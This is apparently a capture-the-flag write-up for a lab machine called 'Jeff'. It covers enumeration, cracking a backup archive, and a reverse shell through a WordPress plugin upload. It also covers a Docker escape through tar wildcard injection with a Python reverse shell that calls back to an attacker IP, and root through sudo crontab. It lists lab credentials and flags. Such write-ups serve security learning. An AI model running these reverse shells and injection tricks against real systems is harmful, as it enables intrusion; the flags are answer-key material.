[*] jeff [*]

# Date : 11/01/2022

# domain_name1 : jeff.thm
# subdomain_name2: wordpress.jeff.thm

# ->Enumeration Phase:

# Nmap 7.91 scan initiated Tue Jan 11 10:53:34 2022 as: nmap -sC -sV -p- -v -oN nmap_all 10.10.211.238
adjust_timeouts2: packet supposedly had rtt of 8472755 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of 8472755 microseconds.  Ignoring time.
Nmap scan report for 10.10.211.238
Host is up (0.36s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e:43:5f:1e:58:a8:fc:c9:f7:fd:4b:40:0b:83:79:32 (RSA)
|   256 5c:79:92:dd:e9:d1:46:50:70:f0:34:62:26:f0:69:39 (ECDSA)
|_  256 ce:d9:82:2b:69:5f:82:d0:f5:5c:9b:3e:be:76:88:c3 (ED25519)
80/tcp open  http    nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 11 11:18:32 2022 -- 1 IP address (1 host up) scanned in 1497.84 seconds

# fuzzing directories on port 80:

@Tool used : gobuster or dirsearch

Target: http://jeff.thm/

[11:37:44] Starting: 
[11:38:21] 301 -  178B  - /admin  ->  http://jeff.thm/admin/
[11:38:22] 200 -    0B  - /admin/
[11:38:22] 200 -    0B  - /admin/?/login
[11:38:23] 200 -    0B  - /admin/index.html
[11:38:23] 200 -    0B  - /admin/login.php
[11:38:40] 403 -  564B  - /assets/
[11:38:40] 301 -  178B  - /assets  ->  http://jeff.thm/assets/
[11:38:42] 301 -  178B  - /backups  ->  http://jeff.thm/backups/
[11:38:42] 200 -    9B  - /backups/
[11:39:08] 200 -    1KB - /index.html
[11:39:48] 200 -  212B  - /uploads/
[11:39:48] 301 -  178B  - /uploads  ->  http://jeff.thm/uploads/
                                                                             
Task Completed

>> after visiting the port 80 website is rendir and also some important info.
$

Hello, My name is Jeff.

I'm a PHP developer, currently working for A FAKE COMPANY LTD. I also dabble in a bit of C and Assembly programming in my spare time, although i'm not very good at these yet. This is my little portfolio page, it's still very much work on progress and I will upgrade it to a wordpress site in the near future.

$

>>username of system : jeff
>> and according to hint we realize that there is a wordpress site is going on 
>> on different domain.

>> so i find all subdomain using gobuster tool:
# gobuster vhost -u domain_name -w <wordlist_file> 
>> then find a subdomain : wordpress.jeff.thm

# the wpscan also find user jeff :

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[32m[+][0m URL: http://wordpress.jeff.thm/ [10.10.142.105]
[32m[+][0m Started: Tue Jan 11 13:32:40 2022

Interesting Finding(s):

[32m[+][0m Headers
 | Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[32m[+][0m XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[32m[+][0m WordPress readme found: http://wordpress.jeff.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[32m[+][0m The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[32m[+][0m WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[32m[+][0m WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [33m[!][0m The version is out of date, the latest version is 1.8
 | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[32m[+][0m Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |===================================================================================================================|

[34m[i][0m User(s) Identified:

[32m[+][0m jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[33m[!][0m No WPScan API Token given, as a result vulnerability data has not been output.
[33m[!][0m You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[32m[+][0m Finished: Tue Jan 11 13:33:12 2022
[32m[+][0m Requests Done: 53
[32m[+][0m Cached Requests: 6
[32m[+][0m Data Sent: 14.308 KB
[32m[+][0m Data Received: 380.154 KB
[32m[+][0m Memory used: 187.406 MB
[32m[+][0m Elapsed time: 00:00:32

>> when i visit the /backups directory there is only one line display:jeff.thm
>> but we have to think that backups are stored in .zip or.tar etc compressed 
>> files.
>> so fuzz .zip or .tar files in /backups directory.
# gobuster dir -u http://<IP>/backups/ -w <wordlist_file> -x .zip,.tar

>> and congrates...
>> i found a backup.zip file and this file is password protected.
>> we have to crack the password of zip file.so i use fcrackzip tool.
# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip

>> found a password : !!Burningbird!!

>> after getting all the files in wpadmin.bak file found a password of
>> wordpress user .
# wordpress password is: phO#g)C5dhIWZn3BKP 

>> after logging into the wordpress having user jeff.then i upload a plugin in 
>> to wordpress plugin section and got a reverse shell.simply add below two 
>> lines in php reverse shell script and at last make it a zip file beacuse 
>> plugins accept only zip files.

$
/**
* Plugin Name : "any name "
* author : "any"
*/
$

# zip -r <name_zip_file> <php-file>

>> and then got reverse shell as www-data.

# -> Exploitation Phase:

>> after some enumeration i know we are in docker container.we have to escape 
>> from docker container.

>> ftp_backup.php file is found in /var/www/html directory.

$
<?php
/* 
    Todo: I need to finish coding this database backup script.
          also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id);
?>
$

>> found two things : username of ftp and password of that user.
>> this script is incomplete we have two complete this script.
>> ftp is running outside the docker and in which a crontab is also running 
>> that make tar file using all the files in files folder in ftp .

# after some enumeration i found a vulnerbility that is : tar wildcard
>> using this we escape the docker container.

>> we have to check the ftp service is writable or not 
>> so run the following command :
# curl -s -D -v -P -' ftp://username:passwpord@host/'
>> result is shown all the info.

>> we have to create shell.sh file contain reverse shell of python
>> do the following commands in victim machine:

# echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.     AF_INET, socket.SOCK_STREAM);s.connect((\"<IP>\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" > shell.sh

# echo "" > "/var/www/html/--checkpoint=1"
# echo "" > "/var/www/html/--checkpoint-action=exec=sh shell.sh"

# curl -v -P - -T "/var/www/html/shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
# curl -v -P - -T "/var/www/html/--checkpoint=1" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'
# curl -v -P - -T "/var/www/html/--checkpoint-action=exec=sh shell.sh" 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files/'

>> and listen the incoming connection using nc on givin port.
>> at last got a backupmgr shell.
>> i enumerate some files having permission of usef jeff

# find / -type -f -user jeff 2>/dev/null

>> find two intersting files
>> 1] /var/backup/jeff.bak
>> 2] /opt/systools/systool

>> after running systool binary using ltarce find that when we give 2nd 
>> options it reads data from message.txt
>> so i delete the message.txt file and symlink to /var/backup/jeff.bak file

# ln -sf /var/backup/jeff.bak message.txt

>> now num the systool binary and choose 2 .and got a password of jeff.
>> on the jeff shell run sudo -l command and find that sudo permission is set
>> to /usr/bin/crontab

>> its easy,run
# sudo /usr/bin/crontab -e
# :!/bin/bash 

>> got root access:
# root.txt : THM{40fc54e5c0f5747dfdd35e0cc7db6ee2}
# user.txt : THM{e122d5588956ef9ba7d4d2b2fee00cac}
